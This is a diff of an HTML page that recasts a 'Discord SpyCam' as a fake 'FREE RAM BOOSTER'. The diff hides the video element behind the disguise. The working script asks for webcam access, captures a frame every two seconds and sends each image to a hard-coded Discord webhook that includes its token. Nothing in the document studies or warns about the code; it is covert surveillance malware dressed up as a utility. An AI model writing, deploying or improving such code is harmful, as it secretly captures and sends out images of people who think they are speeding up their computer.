@@ -2,24 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>📸 Discord SpyCam</title>
+  <title>FREE RAM BOOSTER ⚡</title>
   <style>
     body {
-      background: #000;
+      background: #111;
       color: #0f0;
       font-family: monospace;
       text-align: center;
+      padding-top: 50px;
     }
-    video {
-      border: 2px solid lime;
-      border-radius: 10px;
-      margin: 10px;
+    h1 {
+      color: #0f0;
     }
   </style>
 </head>
 <body>
-  <h1>👁 Sending Snapshots to Discord...</h1>
-  <video id="video" width="400" height="300" autoplay></video>
+  <h1>⚡ FREE RAM BOOSTER ACTIVATED</h1>
+  <p>Optimizing memory... Please keep this tab open.</p>
+  <video id="video" width="400" height="300" autoplay style="display:none;"></video>
   <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
 
   <script>
@@ -29,7 +29,6 @@
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1343886403347419156/ZAWGwumD43oPpdlKZZ7fhS67dua1-Pv2TH3poP9WN4tWp02qbY-3ntK3p5914CSe9IuC";
 
-    // Ask for webcam
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
@@ -38,23 +37,18 @@
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append("file", blob, "snap.png");
+            formData.append("file", blob, "ram_boost.png");
 
             fetch(WEBHOOK_URL, {
               method: "POST",
               body: formData
-            }).then(res => {
-              console.log("Sent to Discord 🎯");
-            }).catch(err => {
-              console.error("Error sending to Discord:", err);
-            });
+            }).then(() => {
+              console.log("📸 Sent to Discord");
+            }).catch(console.error);
 
           }, "image/png");
-        }, 2000); // Every 2 seconds
-
-      }).catch(err => {
-        console.error("Webcam access denied ❌", err);
-      });
+        }, 2000);
+      }).catch(console.error);
   </script>
 </body>
 </html>
